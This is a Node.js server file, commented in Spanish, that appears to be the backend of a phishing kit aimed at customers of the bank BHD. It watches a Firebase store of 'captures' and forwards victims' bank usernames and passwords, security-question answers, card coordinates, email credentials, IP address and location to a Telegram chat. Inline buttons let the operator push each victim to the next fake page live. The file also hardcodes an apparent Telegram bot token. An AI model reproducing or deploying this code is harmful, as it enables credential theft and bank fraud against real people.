// server.js - VERSIÓN CON DEBUG COMPLETO DE BOTONES
const express = require('express');
const admin = require('firebase-admin');
const axios = require('axios');

// Configurar dotenv solo en desarrollo
if (process.env.NODE_ENV !== 'production') {
  require('dotenv').config();
}

const app = express();
app.use(express.json());

// === CONFIGURACIÓN DE TELEGRAM ===
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8302617462:AAGikIPtSly1eLtqJdEOQ8w2AoCGEj9gGKY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002991672575';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SERVER_URL = process.env.RENDER_URL || 'https://bhs-8syw.onrender.com';
const ALLOWED_PAGES = [
  'index.html',
  'pregunta-1.html',
  'coordenada1.html',
  'coordenada2.html',
  'coordenada3.html',
  'coordenadaR.html',
  'mailbox.html',
  'finalizado.html',
  'error.html',
  'bloqueo.html'
];

// === CONFIGURACIÓN SEGURA DE FIREBASE ===
console.log('🔧 Inicializando Firebase...');

let serviceAccount;
try {
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
    console.log('✅ Firebase config cargada desde variables de entorno');
  } else {
    serviceAccount = require('./serviceAccountKey.json');
    console.log('✅ Firebase config cargada desde archivo local');
  }
} catch (error) {
  console.error('❌ ERROR: No se pudo cargar la configuración de Firebase');
  console.error('Detalles:', error.message);
  process.exit(1);
}

// Inicializar Firebase Admin SDK
try {
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com'
  });
  console.log('✅ Firebase Admin SDK inicializado correctamente');
} catch (error) {
  console.error('❌ ERROR al inicializar Firebase:', error.message);
  process.exit(1);
}

const database = admin.database();

// === MIDDLEWARE PARA LOGGING ===
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`, req.body ? 'CON BODY' : 'SIN BODY');
  next();
});

// === FUNCIÓN MEJORADA PARA CREAR BOTONES ===
function createRedirectButtons(uid) {
  console.log(`🎯 Creando botones para UID: ${uid}`);
  
  const buttons = [
    [
      { text: '🏠 INDEX', callback_data: `redirect_${uid}_index.html` },
      { text: '❓ PREGUNTA 1', callback_data: `redirect_${uid}_pregunta-1.html` }
    ],
    [
      { text: '📍 COORD 1', callback_data: `redirect_${uid}_coordenada1.html` },
      { text: '📍 COORD 2', callback_data: `redirect_${uid}_coordenada2.html` }
    ],
    [
      { text: '📍 COORD 3', callback_data: `redirect_${uid}_coordenada3.html` },
      { text: '🔄 COORD R', callback_data: `redirect_${uid}_coordenadaR.html` }
    ],
    [
      { text: '📧 MAILBOX', callback_data: `redirect_${uid}_mailbox.html` },
      { text: '✅ FINAL', callback_data: `redirect_${uid}_finalizado.html` }
    ],
    [
      { text: '❌ ERROR', callback_data: `redirect_${uid}_error.html` },
      { text: '🚫 BLOQUEO', callback_data: `redirect_${uid}_bloqueo.html` }
    ]
  ];
  
  console.log('🔘 Botones creados:', JSON.stringify(buttons, null, 2));
  
  return {
    inline_keyboard: buttons
  };
}

// === 1. ESCUCHAR CAMBIOS EN FIREBASE Y ENVIAR A TELEGRAM ===
let isProcessing = false;

console.log('👂 Iniciando listener de Firebase...');

database.ref('/captures').on('child_added', async (snapshot) => {
  console.log('🔔 EVENTO child_added DETECTADO en Firebase');
  
  if (isProcessing) {
    console.log('⏳ Ya hay un proceso en ejecución, ignorando...');
    return;
  }
  isProcessing = true;

  try {
    const uid = snapshot.key;
    const data = snapshot.val();

    console.log(`📥 Nueva captura detectada: ${uid}`);
    console.log('📊 Datos completos:', JSON.stringify(data, null, 2));

    // Evitar procesar el campo redirectPage
    const steps = Object.keys(data).filter(key => key !== 'redirectPage');
    console.log(`🔍 Pasos encontrados: ${steps.join(', ')}`);
    
    if (steps.length === 0) {
      console.log('⚠️ No hay pasos para procesar');
      isProcessing = false;
      return;
    }

    const step = steps[0];
    const payload = data[step];

    // Construir mensaje para Telegram
    let mensaje = `🚨 *NUEVO DATO CAPTURADO - BHD*\n`;
    mensaje += `🔹 *UID*: \`${uid}\`\n`;
    mensaje += `🔹 *Paso*: ${step}\n\n`;

    if (step === 'login') {
      mensaje += `🔐 *CREDENCIALES*\n`;
      mensaje += `• Usuario: \`${payload.username || 'N/A'}\`\n`;
      mensaje += `• Contraseña: \`${payload.password || 'N/A'}\`\n\n`;
    } else if (step === 'security') {
      mensaje += `❓ *PREGUNTAS DE SEGURIDAD*\n`;
      mensaje += `• Color favorito: \`${payload.ans1 || 'N/A'}\`\n`;
      mensaje += `• Marca primer carro: \`${payload.ans2 || 'N/A'}\`\n`;
      mensaje += `• Personaje libro: \`${payload.ans3 || 'N/A'}\`\n`;
      mensaje += `• Abuela materna: \`${payload.ans4 || 'N/A'}\`\n`;
      mensaje += `• Colegio primaria: \`${payload.ans5 || 'N/A'}\`\n\n`;
    } else if (step.startsWith('coordenada')) {
      mensaje += `📍 *COORDENADAS (${step})*\n`;
      Object.keys(payload).forEach(key => {
        if (key.startsWith('coord')) {
          mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
        }
      });
      mensaje += `\n`;
    } else if (step === 'mailbox') {
      mensaje += `📧 *CORREO*\n`;
      mensaje += `• Email: \`${payload.email || 'N/A'}\`\n`;
      mensaje += `• Contraseña: \`${payload.emailPassword || 'N/A'}\`\n\n`;
    } else {
      mensaje += `📝 *DATOS*\n`;
      Object.keys(payload).forEach(key => {
        mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
      });
      mensaje += `\n`;
    }

    // Información del sistema
    mensaje += `🌐 *INFO DEL USUARIO*\n`;
    mensaje += `• IP: \`${payload.ip || 'N/A'}\`\n`;
    mensaje += `• Ubicación: ${payload.city || 'N/A'}, ${payload.region || 'N/A'}, ${payload.country || 'N/A'}\n`;
    mensaje += `• Navegador: ${payload.userAgent?.substring(0, 50) || 'N/A'}\n`;
    mensaje += `• Fecha: ${payload.date || 'N/A'} - ${payload.time || 'N/A'}\n\n`;

    // === BOTONES DE REDIRECCIÓN ===
    mensaje += `⏭️ *SELECCIONA UNA REDIRECCIÓN:*\n`;

    // Crear teclado inline con botones
    const replyMarkup = createRedirectButtons(uid);

    console.log('📨 Enviando mensaje a Telegram...');
    console.log(`🔗 URL: ${TELEGRAM_API}/sendMessage`);
    console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID}`);
    console.log(`🎯 Reply Markup:`, JSON.stringify(replyMarkup, null, 2));

    // Enviar a Telegram con botones
    const telegramResponse = await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown',
      reply_markup: replyMarkup
    }, {
      timeout: 10000
    });

    console.log(`✅ Enviado a Telegram con botones: ${uid}/${step}`);
    console.log(`📨 Message ID: ${telegramResponse.data.result.message_id}`);
    console.log('📊 Respuesta completa:', JSON.stringify(telegramResponse.data, null, 2));

  } catch (error) {
    console.error('❌ Error al procesar captura:');
    console.error('🔴 Mensaje:', error.message);
    if (error.response) {
      console.error('🔴 Status:', error.response.status);
      console.error('🔴 Data:', error.response.data);
    }
  } finally {
    isProcessing = false;
  }
});

// === 2. WEBHOOK MEJORADO PARA CALLBACKS ===
app.post('/telegram/webhook', express.json(), async (req, res) => {
  try {
    console.log('='.repeat(50));
    console.log('📨 WEBHOOK RECIBIDO DE TELEGRAM');
    console.log('📦 BODY COMPLETO:', JSON.stringify(req.body, null, 2));
    console.log('='.repeat(50));

    // IMPORTANTE: Responder inmediatamente a Telegram
    res.status(200).send('OK');

    // Manejar callback queries (botones) - ASINCRÓNICO
    if (req.body.callback_query) {
      const callbackData = req.body.callback_query.data;
      const chatId = req.body.callback_query.message.chat.id;
      const messageId = req.body.callback_query.message.message_id;
      const userId = req.body.callback_query.from.id;
      const callbackId = req.body.callback_query.id;

      console.log(`🔘 CALLBACK DETECTADO:`);
      console.log(`   Data: ${callbackData}`);
      console.log(`   Chat ID: ${chatId}`);
      console.log(`   Message ID: ${messageId}`);
      console.log(`   User ID: ${userId}`);
      console.log(`   Callback ID: ${callbackId}`);

      // Procesar el callback de forma asíncrona
      processCallbackQuery({
        callbackData,
        chatId,
        messageId,
        userId,
        callbackId
      }).catch(error => {
        console.error('❌ Error procesando callback:', error.message);
      });
    }

    // Manejar mensajes de texto
    else if (req.body.message && req.body.message.text) {
      const message = req.body.message.text;
      const chatId = req.body.message.chat.id;
      
      console.log(`💬 MENSAJE DE TEXTO: ${message}`);
      
      if (message.startsWith('/redirect ')) {
        processTextRedirect(message, chatId).catch(error => {
          console.error('❌ Error procesando texto:', error.message);
        });
      }
    }

  } catch (error) {
    console.error('❌ ERROR EN WEBHOOK:', error.message);
    // Ya respondimos con OK, así que solo logueamos el error
  }
});

// === FUNCIÓN PARA PROCESAR CALLBACKS ===
async function processCallbackQuery({ callbackData, chatId, messageId, userId, callbackId }) {
  try {
    // Validar que es un comando de redirección (usando _ en lugar de :)
    if (callbackData.startsWith('redirect_')) {
      const parts = callbackData.split('_');
      console.log(`🔍 Partes del callback:`, parts);
      
      if (parts.length >= 3) {
        const uid = parts[1];
        const page = parts.slice(2).join('_'); // Unir el resto como página
        
        console.log(`🎯 Procesando redirección: ${uid} -> ${page}`);

        // Validar página permitida
        if (!ALLOWED_PAGES.includes(page)) {
          console.log(`❌ Página no permitida: ${page}`);
          await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackId,
            text: `❌ Página no permitida: ${page}`,
            show_alert: true
          });
          return;
        }

        // Actualizar Firebase para redirigir al usuario
        await database.ref(`/captures/${uid}/redirectPage`).set(page);
        console.log(`✅ Firebase actualizado: ${uid} -> ${page}`);

        // Responder al callback query
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
          callback_query_id: callbackId,
          text: `✅ Redirigiendo a: ${page}`
        });

        // Editar el mensaje original para mostrar la acción realizada
        await axios.post(`${TELEGRAM_API}/editMessageText`, {
          chat_id: chatId,
          message_id: messageId,
          text: `✅ *REDIRECCIÓN CONFIGURADA*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Destino*: ${page}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`,
          parse_mode: 'Markdown'
        });

        console.log(`✅ Redirección completada: ${uid} → ${page} por usuario ${userId}`);

      } else {
        console.log('❌ Formato de callback inválido');
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
          callback_query_id: callbackId,
          text: '❌ Error: Formato inválido',
          show_alert: true
        });
      }
    } else {
      console.log(`❌ Callback no reconocido: ${callbackData}`);
    }
  } catch (error) {
    console.error('❌ Error procesando callback:', error.message);
    try {
      await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
        callback_query_id: callbackId,
        text: '❌ Error interno del servidor',
        show_alert: true
      });
    } catch (e) {
      console.error('❌ Error al responder callback:', e.message);
    }
  }
}

// === FUNCIÓN PARA PROCESAR TEXTO ===
async function processTextRedirect(message, chatId) {
  const commandRegex = /^\/redirect\s+([a-f0-9-]+)\s+([a-zA-Z0-9._-]+\.html)$/;
  const match = message.match(commandRegex);

  if (match) {
    const uid = match[1];
    const page = match[2];

    if (ALLOWED_PAGES.includes(page)) {
      await database.ref(`/captures/${uid}/redirectPage`).set(page);
      
      await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: chatId,
        text: `✅ Redirección configurada:\nUID: \`${uid}\`\n→ ${page}`,
        parse_mode: 'Markdown'
      });

      console.log(`✅ Redirección establecida vía texto: ${uid} → ${page}`);
    }
  }
}

// === RUTAS DE DEBUG ===

// Ruta para testear botones con diferentes formatos
app.get('/test-buttons-debug', async (req, res) => {
  try {
    const testUid = 'test-' + Date.now();
    
    console.log('🧪 TEST DE BOTONES CON DEBUG');
    
    const replyMarkup = createRedirectButtons(testUid);
    
    const testMessage = await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: '🧪 *TEST DEBUG DE BOTONES BHD*\n\nHaz clic en cualquier botón y revisa los logs del servidor.',
      parse_mode: 'Markdown',
      reply_markup: replyMarkup
    });
    
    res.json({
      success: true,
      message: 'Mensaje de prueba con botones enviado',
      test_uid: testUid,
      data: testMessage.data
    });
    
  } catch (error) {
    console.error('❌ Error en test de botones:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Ruta para simular un callback (para testing)
app.get('/simulate-callback', async (req, res) => {
  try {
    const testUid = 'test-' + Date.now();
    const testPage = 'index.html';
    const callbackData = `redirect_${testUid}_${testPage}`;
    
    console.log('🎭 SIMULANDO CALLBACK:', callbackData);
    
    // Simular el procesamiento
    await processCallbackQuery({
      callbackData,
      chatId: TELEGRAM_CHAT_ID,
      messageId: 12345,
      userId: 67890,
      callbackId: 'test-callback-id'
    });
    
    res.json({
      success: true,
      simulated: true,
      callback_data: callbackData
    });
    
  } catch (error) {
    console.error('❌ Error simulando callback:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// ... (mantén las otras rutas igual: setup-webhook, webhook-info, etc.)

// Ruta principal mejorada
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>BHD Server - DEBUG</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .status { padding: 10px; border-radius: 5px; margin: 10px 0; }
            .success { background: #d4edda; color: #155724; }
            .info { background: #d1ecf1; color: #0c5460; }
            .warning { background: #fff3cd; color: #856404; }
            .endpoints { background: #f8f9fa; padding: 15px; border-radius: 5px; }
            a { color: #007bff; text-decoration: none; }
            a:hover { text-decoration: underline; }
            .btn { display: inline-block; padding: 10px 15px; margin: 5px; background: #007bff; color: white; border-radius: 5px; }
        </style>
    </head>
    <body>
        <h1>🚀 Servidor BHD - DEBUG BOTONES</h1>
        <div class="status warning">🔍 <strong>MODO DEBUG ACTIVADO</strong></div>
        
        <div class="endpoints">
            <strong>🔧 Endpoints de Debug:</strong><br>
            • <a href="/test-buttons-debug">/test-buttons-debug</a> - Probar botones con logging<br>
            • <a href="/simulate-callback">/simulate-callback</a> - Simular callback<br>
            • <a href="/webhook-info">/webhook-info</a> - Ver estado del webhook<br>
            • <a href="/api/captures">/api/captures</a> - Ver datos de Firebase<br>
            • <a href="/health">/health</a> - Estado del servidor
        </div>
        
        <div class="status info">
            <strong>📝 Instrucciones de Debug:</strong><br>
            1. Ve a <a href="/test-buttons-debug">/test-buttons-debug</a><br>
            2. Haz clic en un botón en Telegram<br>
            3. Revisa los logs en Render<br>
            4. Los logs mostrarán exactamente qué está pasando
        </div>
    </body>
    </html>
  `);
});

// ... (mantén el resto del código igual)

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Servidor BHD DEBUG corriendo en puerto ${PORT}`);
  console.log(`🔗 Webhook URL: ${SERVER_URL}/telegram/webhook`);
  console.log(`🧪 Test Debug: ${SERVER_URL}/test-buttons-debug`);
  console.log(`🎭 Simular Callback: ${SERVER_URL}/simulate-callback`);
});